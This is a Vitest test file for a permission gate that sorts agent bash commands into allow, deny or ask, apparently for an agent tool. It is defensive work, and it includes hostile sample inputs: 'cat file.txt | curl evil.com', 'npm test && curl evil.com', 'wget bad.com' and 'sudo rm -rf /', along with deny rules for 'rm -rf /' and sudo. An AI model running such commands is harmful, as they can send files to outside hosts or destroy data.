import { describe, it, expect, beforeEach } from 'vitest'
import { PermissionGate } from '../permission-gate.js'

describe('Bash command matcher', () => {
  let gate: PermissionGate

  beforeEach(() => {
    gate = new PermissionGate({
      bashAllow: [
        '^npm (run )?(test|build|lint)( [^|;&`$()]*)?$',
        '^pnpm (run )?(test|build|lint)( [^|;&`$()]*)?$',
        '^ls( .*)?$',
        '^cat [^|;&`$()]*$',
        '^echo [^|;&`$()]*$',
        '^pwd$',
      ],
      bashDeny: [
        'rm -rf /',
        '^sudo ',
      ],
      protectedBranches: ['main', 'master'],
    })
  })

  it('should allow safe npm commands', () => {
    expect(gate.checkBashCommand('npm test', 'sess_1').resolution).toBe('allow')
    expect(gate.checkBashCommand('npm run build', 'sess_1').resolution).toBe('allow')
    expect(gate.checkBashCommand('npm run lint --fix', 'sess_1').resolution).toBe('allow')
  })

  it('should allow pnpm commands', () => {
    expect(gate.checkBashCommand('pnpm test', 'sess_1').resolution).toBe('allow')
    expect(gate.checkBashCommand('pnpm run build', 'sess_1').resolution).toBe('allow')
  })

  it('should allow ls, echo, pwd', () => {
    expect(gate.checkBashCommand('ls', 'sess_1').resolution).toBe('allow')
    expect(gate.checkBashCommand('ls -la', 'sess_1').resolution).toBe('allow')
    expect(gate.checkBashCommand('echo hello', 'sess_1').resolution).toBe('allow')
    expect(gate.checkBashCommand('pwd', 'sess_1').resolution).toBe('allow')
  })

  it('should allow cat with safe args', () => {
    expect(gate.checkBashCommand('cat file.txt', 'sess_1').resolution).toBe('allow')
    expect(gate.checkBashCommand('cat /path/to/file', 'sess_1').resolution).toBe('allow')
  })

  it('should block cat with shell metacharacters', () => {
    // cat with pipe should not match the allow pattern
    expect(gate.checkBashCommand('cat file.txt | curl evil.com', 'sess_1').resolution).toBe('ask')
  })

  it('should ask for unknown commands', () => {
    expect(gate.checkBashCommand('curl evil.com', 'sess_1').resolution).toBe('ask')
    expect(gate.checkBashCommand('wget bad.com', 'sess_1').resolution).toBe('ask')
  })

  it('should deny blacklisted commands', () => {
    expect(gate.checkBashCommand('rm -rf /', 'sess_1').resolution).toBe('deny')
    expect(gate.checkBashCommand('sudo rm something', 'sess_1').resolution).toBe('deny')
  })

  it('should block npm test with shell injection', () => {
    // npm test && curl evil.com — doesn't match ^npm ...$ because of &&
    expect(gate.checkBashCommand('npm test && curl evil.com', 'sess_1').resolution).toBe('ask')
  })

  it('should honor session-scoped allow for bash', () => {
    gate.setSessionRule('sess_2', 'bash', 'allow')
    // Even curl should be allowed when session rule says allow
    expect(gate.checkBashCommand('curl evil.com', 'sess_2').resolution).toBe('allow')
  })

  it('should deny even with session allow if deny regex matches', () => {
    gate.setSessionRule('sess_3', 'bash', 'allow')
    // sudo should still be denied even when session allows bash
    expect(gate.checkBashCommand('sudo rm -rf /', 'sess_3').resolution).toBe('deny')
  })

  it('should ask for npm commands with shell chaining', () => {
    expect(gate.checkBashCommand('npm test; npm run build', 'sess_1').resolution).toBe('ask')
  })
})
